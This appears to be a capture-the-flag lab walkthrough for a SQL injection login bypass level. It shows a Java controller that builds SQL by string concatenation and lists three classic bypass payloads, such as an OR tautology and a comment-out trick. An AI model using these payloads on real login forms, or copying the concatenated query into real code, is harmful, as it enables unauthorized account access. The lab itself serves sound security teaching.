# Level 1 — SQL Login Bypass

## Challenge Overview

This level simulates a login endpoint that uses string concatenation to construct SQL statements without parameterization. Attackers can bypass password verification by injecting SQL fragments.

**Objective**: Exploit SQL injection to bypass login and obtain the Flag.

## Vulnerability Principle

### Code Logic Analysis

Backend code: `SqlLoginController.java`, endpoint:

```
POST /api/challenge/injection/sql/login
```

**Data Flow**:

```
User inputs username + password
    ↓
POST /api/challenge/injection/sql/login  {username, password}
    ↓
SQL constructed: SELECT * FROM users WHERE username='...' AND password='...'
    ↓
containsSqlInjection() detects injection features
    ↓
Injection detected → Returns Flag
No injection → Normal login validation
```

**Vulnerabilities**:

1. SQL statements use string concatenation without parameterization
2. Simulates common login bypass scenarios (OR injection, comment operators)

### Key Source Code

```java
// SqlLoginController.java — String concatenation for SQL
String simulatedSql = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";

if (containsSqlInjection(username) || containsSqlInjection(password)) {
    String flag = flagService.getFlag("injection", "level1");
    result.put("flag", flag);
}
```

## Walkthrough

### Step 1: Observe SQL Preview

Visit the login page and observe the SQL preview area below the input fields.

### Step 2: Craft Injection Payload

Enter one of the following in the username field:

| Payload | Principle |
|---------|-----------|
| `admin' OR '1'='1` | Inject OR tautology |
| `admin' --` | Comment out password check |
| `' OR 1=1 --` | Universal login bypass |

### Step 3: Obtain the Flag

Submit the obtained Flag in the challenge's Flag submission box to complete the level.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/injection/SqlLoginController.java` | Backend login endpoint with SQL concatenation |
| `service/FlagService.java` | Flag retrieval and validation |
